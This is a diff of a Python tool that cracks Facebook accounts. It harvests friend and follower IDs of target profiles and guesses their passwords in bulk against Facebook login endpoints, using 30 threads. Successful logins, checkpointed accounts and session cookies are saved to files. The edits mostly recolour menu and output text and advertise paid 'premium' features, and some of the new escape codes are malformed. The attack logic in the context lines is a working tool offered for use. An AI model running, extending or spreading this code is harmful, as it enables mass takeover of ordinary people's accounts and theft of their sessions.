@@ -115,16 +115,24 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		exit(" ! no internet connection")
 	logo()
-	
+	print("\n\033[1;37m[\033[1;32m01\033[1;37m] This Tool is for 033[1;33FREE 033[1;37use except \033[1;37[033[1;31premium033[1;37]")
 	print("\n\033[1;37m[\033[1;32m01\033[1;37m] Crack from public \033[1;32mFRIENDS")
 	print("\033[1;37m[\033[1;32m02\033[1;37m] Crack from public  \033[1;32mFOLLOWERS")
-	print("\033[1;37m[\033[1;32m03\033[1;37m] Crack from  \033[1;32mMULTI-ID's \033[1;93m [ \033[1;31mPRO \033[1;97m]")
+	print("\033[1;37m[\033[1;32m03\033[1;37m] Crack from  \033[1;32mMULTI-ID's \033[1;37m [ \033[1;31mPRO \033[1;97m]")
 	print("\033[1;37m[\033[1;32m04\033[1;37m] Chack Crack  \033[1;32mRESULTS")
 	print("\033[1;37m[\033[1;32m05\033[1;37m] User-agent  \033[1;32mSETTINGS\033[1;97m [ \033[1;91mPRO \033[1;97m]")
+	
+	print("\n\033[1;37m[\033[1;32m+\033[1;37m] This tools are for \033[1;37m[\033[1;31mpremium\033[1;37m]")
+	print("\n\033[1;37m[\033[1;32m06\033[1;37m] Unfriend all \033[1;32mFRIENDS")
+	print("\n\033[1;37m[\033[1;32m07\033[1;37m] Activate \033[1;37m[\033[1;31mGUARD ON\033[1;37m]")
+	print("\n\033[1;37m[\033[1;32m08\033[1;37m] Activate \033[1;37m[\033[1;31mLOCKED-PROFILE\033[1;37m]")
+	print("\n\033[1;37m[\033[1;32m09\033[1;37m] Crack Id's from \033[1;37m[\033[1;32mSEARCH NAME\033[1;37m")
+	
+	print("\n\033[1;37m[\033[1;32m+\033[1;37m] For \033[1;37m[\033[1;31mpremium\033[1;37m] use/Access contact Aurthor on below link ")
+	print("\n\033[1;37m[\033[1;32m+\033[1;37m] Arthor Link \033[1;37m[\033[1;33https://www.facebook.com/profile.php?id=100008297554931\033[1;37m]")
 	print("\033[1;37m[\033[1;32m00\033[1;37m] Exit\033[1;32m [ \033[1;33mLogout \033[1;97m]")
 	
-	print("\n\033[1;32m[\033[1;32m01\033[1;32m] Crack from public friends")
-	Bilal = raw_input("\n\033[1;32m[\033[1;32m+\033[1;33m] Choose : ")
+	Bilal = raw_input("\n\033[1;37m[\033[1;32m+\033[1;37m] Choose : ")
 	if Bilal =="":
 		menu()
 	elif Bilal == "1" or Bilal == "01":
@@ -196,7 +204,7 @@ def publik():
 		token = open("login.txt", "r").read()
 	except IOError:
 		exit("\n\033[1;31m[\033[1;31m!\033[1;31m] Token Error")
-	idt = raw_input("\n\033[1;96m[\033[1;94m+\033[1;96m] Target Id: ")
+	idt = raw_input("\n\033[1;37m[\033[1;32m+\033[1;37m] Target Id: ")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 			uid = i["id"]
@@ -229,11 +237,11 @@ def massal():
 	except IOError:
 		exit("\033[1;31m[\033[1;31m+\033[1;31m] Token Error")
 	try:
-		tanya_Total = int(input("\033[1;33m[\033[1;33m+\033[1;33m] Enter Multi crack number [option] : "))
+		tanya_Total = int(input("\033[1;37m[\033[1;32m+\033[1;37m] Enter Multi crack number 033[1;32[option] : "))
 	except:tanya_Total=1
 	for t in range(tanya_Total):
 		t +=1
-		idt = raw_input("\033[1;31m[\033[1;31m+\033[1;31m] Target ID %s : "%(t))
+		idt = raw_input("\033[1;31m[\033[1;31m+\033[1;37m] Target ID 033[1;32 %s : "%(t))
 		try:
 			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 				uid = i["id"]
@@ -244,29 +252,29 @@ def massal():
 	print("\033[1;33m[\033[1;33m?\033[1;33m] Total id  : \033[0;33m%s\033[0;33m"%(len(id)))
 
 def method():
-	print("\n\033[1;33m[\033[1;33m?\033[1;33m] Pick cracking methord")
-	print("\033[1;32m[\033[1;32m1\033[1;32m] B-api\033[1;31m [ \033[1;31mPRO/Faster\033[1;31m]")
-	print("\033[1;32m[\033[1;32m2\033[1;32m] Mbasic\033[1;31m [ \033[1;31mFast\033[1;31m]")
-	print("\033[1;32m[\033[1;32m3\033[1;32m] Free Facebook\033[1;32m [ \033[1;31mNormal\033[1;m]")
-	method = raw_input("\033[1;32m[\033[1;32m?\033[1;32m] Pick cracking methord : ")
+	print("\n\033[1;37m[\033[1;32m?\033[1;37m] Pick cracking methord")
+	print("\033[1;37m[\033[1;32m1\033[1;37m] B-api\033[1;37m [ \033[1;31mPRO/Faster\033[1;37m]")
+	print("\033[1;37m[\033[1;32m2\033[1;37m] Mbasic\033[1;37m [ \033[1;32mFast\033[1;37m]")
+	print("\033[1;37m[\033[1;32m3\033[1;37m] Free Facebook\033[1;37m [ \033[1;33mNormal\033[1;37m]")
+	method = raw_input("\033[1;37m[\033[1;32m?\033[1;37m] Pick cracking methord : ")
 	if method == "":
 		menu()
 	elif method == "1":
-		ask = raw_input("\033[1;31m[\033[1;31m!\033[1;91m] Use manual passwords y/t\033[1;97m [ \033[1;96mDefault : t \033[1;97m] : ")
+		ask = raw_input("\033[1;37m[\033[1;32m!\033[1;37m] Use manual passwords y/t\033[1;37m [ \033[1;32mDefault : t \033[1;37m] : ")
 		if ask == "y":
 			manual()
 		print(" ")
 		ThreadPool(30).map(bapi, id)
 		exit("Program End")
 	elif method == "2":
-		ask = raw_input("\033[1;31m[\033[1;31m03\033[1;31m] Use manual passwords y/t\033[1;33m [ \033[1;33mDefault : t \033[1;33m] ")
+		ask = raw_input("\033[1;37m[\033[1;32m!\033[1;37m] Use manual passwords y/t\033[1;37m [ \033[1;32mDefault : t \033[1;37m] ")
 		if ask == "y":
 			manual()
 		print(" ")
 		ThreadPool(30).map(mbasic, id)
 		exit("Program End")
 	elif method == "3":
-		ask = raw_input("\033[1;31m[\033[1;31m!\033[1;31m] Use manual passwords y/t\033[1;33m [ \033[1;33mDefault : t \033[1;33m] ")
+		ask = raw_input("\033[1;37m[\033[1;32m!\033[1;37m] Use manual passwords y/t\033[1;37m [ \033[1;32mDefault : t \033[1;37m] ")
 		if ask == "y":
 			manual()
 		print(" ")
@@ -316,13 +324,13 @@ def bapi(user):
 			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
 			if "session_key" in send.text and "EAAA" in send.text:
-				print("\r\033[1;92m[FUEGO-OK] %s|%s|%s\033[1;92m"%(uid, pw, send.json()[""]))
+				print("\r\033[1;97m[FUEGO-OK] %s|%s|%s\033[1;92m"%(uid, pw, send.json()[""]))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[1;92m[FUEGO-CP] %s|%s\033[1;92m        "%(uid, pw))
+				print("\r\033[1;97m[FUEGO-CP] %s|%s\033[1;92m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -368,13 +376,13 @@ def mbasic(user):
 			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[1;92m[FUEGO-OK] %s|%s|%s\033[1;92m"%(uid, pw, kuki))
+				print("\r\033[1;97m[FUEGO-OK] %s|%s|%s\033[1;97m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[1;95m[FUEGO-CP] %s|%s\033[1;96m        "%(uid, pw))
+				print("\r\033[1;97m[FUEGO-CP] %s|%s\033[1;97m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break 
@@ -391,7 +399,7 @@ def mobile(user):
 		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 	global loop, token
 	sys.stdout.write(
-		"\r\033[1;91m[\033[1;92mCracking\033[1;92m]\033[1;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
+		"\r\033[1;91m[\033[1;92mCracking\033[1;91m]\033[1;97m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
@@ -420,13 +428,13 @@ def mobile(user):
 			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[1;92m[FUEGO-OK] %s|%s|%s\033[1;92m"%(uid, pw, kuki))
+				print("\r\033[1;97m[FUEGO-OK] %s|%s|%s\033[1;97m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[1;92m[FUEGO-CP] %s|%s\033[0;92m        "%(uid, pw))
+				print("\r\033[1;97m[FUEGO-CP] %s|%s\033[0;97m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -472,13 +480,13 @@ def manual():
 				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 				if "c_user" in ses.cookies.get_dict().keys():
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r\033[1;92m[FUEGO-OK] %s|%s|%s\033[1;92m"%(uid, pw, kuki))
+					print("\r\033[1;97m[FUEGO-OK] %s|%s|%s\033[1;97m"%(uid, pw, kuki))
 					ok.append("%s|%s"%(uid, pw))
 					open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
 					continue
 				elif "checkpoint" in ses.cookies.get_dict().keys():
-					print("\r\033[1;92m[FUEGO-CP] %s|%s\033[1;91m        "%(uid, pw))
+					print("\r\033[1;97m[FUEGO-CP] %s|%s\033[1;97m        "%(uid, pw))
 					cp.append("%s|%s"%(uid, pw))
 					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
